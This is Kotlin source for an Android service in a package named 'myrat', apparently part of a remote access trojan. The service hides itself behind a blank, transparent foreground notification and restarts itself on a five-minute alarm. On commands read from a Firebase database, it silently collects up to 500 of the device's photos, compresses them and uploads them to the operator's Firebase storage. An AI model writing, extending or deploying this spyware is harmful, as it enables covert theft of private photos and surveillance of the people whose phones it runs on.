package com.myrat.app.service

import android.Manifest
import android.app.*
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.IBinder
import android.os.SystemClock
import android.provider.MediaStore
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.storage.FirebaseStorage
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream

class ImageUploadService : Service() {

    private val db = FirebaseDatabase.getInstance().reference
    private val storage = FirebaseStorage.getInstance().reference
    private lateinit var deviceId: String
    private lateinit var sharedPref: android.content.SharedPreferences
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob() + CoroutineExceptionHandler { _, e ->
        Logger.error("Coroutine error: ${e.message}", e)
        if (::deviceId.isInitialized) {
            db.child("Device").child(deviceId).child("images").child("lastUploadError")
                .setValue("Coroutine error: ${e.message}")
        }
    })

    override fun onCreate() {
        super.onCreate()

        startForegroundService()
        scheduleRestart(this)
        deviceId = try {
            MainActivity.getDeviceId(this)
        } catch (e: Exception) {
            Logger.error("Failed to get device ID: ${e.message}", e)
            stopSelf()
            return
        }
        sharedPref = getSharedPreferences("image_upload_pref", Context.MODE_PRIVATE)
        getSharedPreferences("service_state", Context.MODE_PRIVATE)
            .edit().putBoolean("ImageUploadService_running", true).apply()
        Logger.log("ImageUploadService started for deviceId: $deviceId")

        listenForUploadCommand()
    }

    private fun scheduleRestart(context: Context) {
        val alarmIntent = Intent(context, ImageUploadService::class.java)
        val pendingIntent = PendingIntent.getService(
            context, 0, alarmIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.setRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 60_000, // delay before restart
            5 * 60_000, // repeat every 5 minutes
            pendingIntent
        )
    }

    private fun startForegroundService() {
        val channelId = "ImageUploader"
        val channelName = "Image Upload Service"

        val manager = getSystemService(NotificationManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, channelName, NotificationManager.IMPORTANCE_LOW)
            channel.setShowBadge(false)
            manager.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.color.transparent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        try {
            startForeground(6, notification)
        } catch (e: Exception) {
            Logger.error("Failed to start foreground service: ${e.message}", e)
            stopSelf()
        }
    }

    private fun listenForUploadCommand() {
        val imagesRef = db.child("Device").child(deviceId).child("images")

        imagesRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val shouldUpload = snapshot.child("getImages").getValue(Boolean::class.java) ?: false
                val fetchAllImages = snapshot.child("fetchAllImages").getValue(Boolean::class.java) ?: false
                val howMany = snapshot.child("HowManyImagesToUpload").getValue(Int::class.java) ?: 0
                val dateFrom = snapshot.child("DateFrom").getValue(Long::class.java) ?: 0L
                val dateTo = snapshot.child("DateTo").getValue(Long::class.java) ?: Long.MAX_VALUE

                if (fetchAllImages) {
                    Logger.log("Command received: Upload all images")
                    uploadAllImages()
                    imagesRef.child("fetchAllImages").setValue(false)
                } else if (shouldUpload) {
                    when {
                        dateFrom > 0 -> {
                            Logger.log("Command received: Upload images from $dateFrom to $dateTo")
                            uploadImagesFromDateRange(dateFrom, dateTo)
                        }
                        howMany > 0 -> {
                            Logger.log("Command received: Upload last $howMany images")
                            uploadRecentImagesByCount(howMany)
                        }
                        else -> {
                            Logger.log("Invalid command parameters: dateFrom=$dateFrom, dateTo=$dateTo, limit=$howMany")
                        }
                    }
                    imagesRef.child("getImages").setValue(false)
                }
            }

            override fun onCancelled(error: DatabaseError) {
                imagesRef.child("lastUploadError").setValue("Failed to read command: ${error.message}")
            }
        })
    }

    private fun uploadImagesFromDateRange(dateFrom: Long, dateTo: Long) {
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_TAKEN
            ),
            "${MediaStore.Images.Media.DATE_TAKEN} > ? AND ${MediaStore.Images.Media.DATE_TAKEN} <= ?",
            arrayOf(dateFrom.toString(), dateTo.toString()),
            "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        )

        val imageList = mutableListOf<Map<String, Any>>()
        var earliestDate = Long.MAX_VALUE
        var latestDate = dateFrom

        cursor?.use {
            while (it.moveToNext()) {
                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val fileName = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))

                imageList.add(
                    mapOf(
                        "fileName" to fileName,
                        "dateTaken" to dateTaken,
                        "uri" to ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id).toString(),
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (dateTaken > latestDate) latestDate = dateTaken
                if (dateTaken < earliestDate) earliestDate = dateTaken
            }
        } ?: Logger.log("Cursor is null for date range query")

        if (imageList.isNotEmpty()) {
            Logger.log("Found ${imageList.size} images from $earliestDate to $latestDate")
            uploadImagesInBatches(imageList.reversed(), latestDate, earliestDate)
        } else {
            Logger.log("No images found from $dateFrom to $dateTo")
            db.child("Device").child(deviceId).child("images").child("lastUploadError")
                .setValue("No images found in date range")
        }
    }

    private fun uploadRecentImagesByCount(limit: Int) {
        val maxLimit = minOf(limit, 500)
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_TAKEN
            ),
            null,
            null,
            "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        )

        val imageList = mutableListOf<Map<String, Any>>()
        var earliestDate = Long.MAX_VALUE
        var latestDate = 0L

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < maxLimit) {
                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val fileName = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))

                imageList.add(
                    mapOf(
                        "fileName" to fileName,
                        "dateTaken" to dateTaken,
                        "uri" to ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id).toString(),
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (dateTaken > latestDate) latestDate = dateTaken
                if (dateTaken < earliestDate) earliestDate = dateTaken
                count++
            }
        } ?: Logger.log("Cursor is null for recent images query")

        if (imageList.isNotEmpty()) {
            Logger.log("Fetched last ${imageList.size} images")
            uploadImagesInBatches(imageList.reversed(), latestDate, earliestDate)
        } else {
            Logger.log("No images found")
            db.child("Device").child(deviceId).child("images").child("lastUploadError")
                .setValue("No images found")
        }
    }

    private fun uploadAllImages() {
        val maxLimit = 500
        val cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_TAKEN
            ),
            null,
            null,
            "${MediaStore.Images.Media.DATE_TAKEN} DESC"
        )

        val imageList = mutableListOf<Map<String, Any>>()
        var earliestDate = Long.MAX_VALUE
        var latestDate = 0L

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < maxLimit) {
                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                val fileName = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))

                imageList.add(
                    mapOf(
                        "fileName" to fileName,
                        "dateTaken" to dateTaken,
                        "uri" to ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id).toString(),
                        "uploaded" to System.currentTimeMillis()
                    )
                )

                if (dateTaken > latestDate) latestDate = dateTaken
                if (dateTaken < earliestDate) earliestDate = dateTaken
                count++
            }
        } ?: Logger.log("Cursor is null for all images query")

        if (imageList.isNotEmpty()) {
            Logger.log("Fetched ${imageList.size} images for all images command")
            uploadImagesInBatches(imageList.reversed(), latestDate, earliestDate)
        } else {
            Logger.log("No images found for all images command")
            db.child("Device").child(deviceId).child("images").child("lastUploadError")
                .setValue("No images found")
        }
    }

    private fun compressImageToWebP(uri: android.net.Uri, fileName: String): File? {
        return try {
            contentResolver.openInputStream(uri)?.use { inputStream ->
                val bitmap = BitmapFactory.decodeStream(inputStream)
                if (bitmap == null) {
                    Logger.log("Failed to decode bitmap for $fileName")
                    return null
                }

                val targetSize = 1024 * 1024 // 1MB
                var quality = 80
                var byteArray: ByteArray
                val outputStream = ByteArrayOutputStream()

                do {
                    outputStream.reset()
                    bitmap.compress(
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                            Bitmap.CompressFormat.WEBP_LOSSY
                        else
                            Bitmap.CompressFormat.WEBP,
                        quality,
                        outputStream
                    )
                    byteArray = outputStream.toByteArray()
                    quality -= 5
                } while (byteArray.size > targetSize && quality > 10)

                val tempFile = File(cacheDir, "${fileName.substringBeforeLast('.')}.webp")
                FileOutputStream(tempFile).use { fileOutput ->
                    fileOutput.write(byteArray)
                }
                Logger.log("Compressed image $fileName to WebP, size: ${byteArray.size / 1024}KB")
                tempFile
            } ?: run {
                Logger.log("Failed to open input stream for $fileName")
                null
            }
        } catch (e: Exception) {
            Logger.error("Error compressing image $fileName: ${e.message}", e)
            null
        }
    }

    private fun uploadImagesInBatches(
        images: List<Map<String, Any>>,
        latestDate: Long,
        earliestDate: Long = latestDate,
        batchSize: Int = 20,
        delayBetweenBatches: Long = 200L
    ) {
        scope.launch {
            val imagesRef = db.child("Device").child(deviceId).child("images/data")

            images.chunked(batchSize).forEachIndexed { index, batch ->
                Logger.log("Uploading batch ${index + 1}/${(images.size + batchSize - 1) / batchSize}")

                val tasks = batch.map { image ->
                    async {
                        val fileName = image["fileName"] as String
                        val uri = android.net.Uri.parse(image["uri"] as String)
                        val sanitizedFileName = fileName.replace("[^a-zA-Z0-9.-]".toRegex(), "_")
                        val storagePath = "images/$deviceId/${sanitizedFileName.substringBeforeLast('.')}.webp"
                        val storageRef = storage.child(storagePath)

                        try {
                            val compressedFile = compressImageToWebP(uri, fileName)
                            if (compressedFile == null) {
                                Logger.log("Failed to compress image $fileName")
                                imagesRef.root.child("Device").child(deviceId).child("images")
                                    .child("lastUploadError").setValue("Compression failed: $fileName")
                                return@async
                            }

                            storageRef.putFile(android.net.Uri.fromFile(compressedFile))
                                .addOnSuccessListener {
                                    Logger.log("Uploaded image: $fileName")
                                    imagesRef.push().setValue(
                                        image.plus("storagePath" to storagePath)
                                    ).addOnFailureListener { e ->
                                        Logger.error("Failed to save image metadata: ${e.message}", e)
                                        imagesRef.root.child("Device").child(deviceId).child("images")
                                            .child("lastUploadError").setValue("Metadata save failed: ${e.message}")
                                    }
                                    compressedFile.delete()
                                }.addOnFailureListener { e ->
                                    Logger.error("Failed to upload image $fileName: ${e.message}", e)
                                    imagesRef.root.child("Device").child(deviceId).child("images")
                                        .child("lastUploadError").setValue("Upload failed: ${e.message}")
                                    compressedFile.delete()
                                }
                        } catch (e: Exception) {
                            Logger.error("Error processing image $fileName: ${e.message}", e)
                            imagesRef.root.child("Device").child(deviceId).child("images")
                                .child("lastUploadError").setValue("Processing error: ${e.message}")
                        }
                    }
                }

                tasks.awaitAll()
                delay(delayBetweenBatches)
            }

            sharedPref.edit().putLong("last_image_timestamp", latestDate).apply()
            Logger.log("Upload complete. Latest timestamp saved: $latestDate")

            db.child("Device").child(deviceId).child("images").apply {
                child("lastUploadCompleted").setValue(System.currentTimeMillis())
                child("lastUploadError").setValue(null)
                child("totalImagesUploaded").get().addOnSuccessListener { snapshot ->
                    val currentTotal = snapshot.getValue(Int::class.java) ?: 0
                    child("totalImagesUploaded").setValue(currentTotal + images.size)
                }
                child("uploadDateFrom").setValue(earliestDate)
                child("uploadDateTo").setValue(latestDate)
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
        getSharedPreferences("service_state", Context.MODE_PRIVATE)
            .edit().putBoolean("ImageUploadService_running", false).apply()
        Logger.log("ImageUploadService destroyed")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}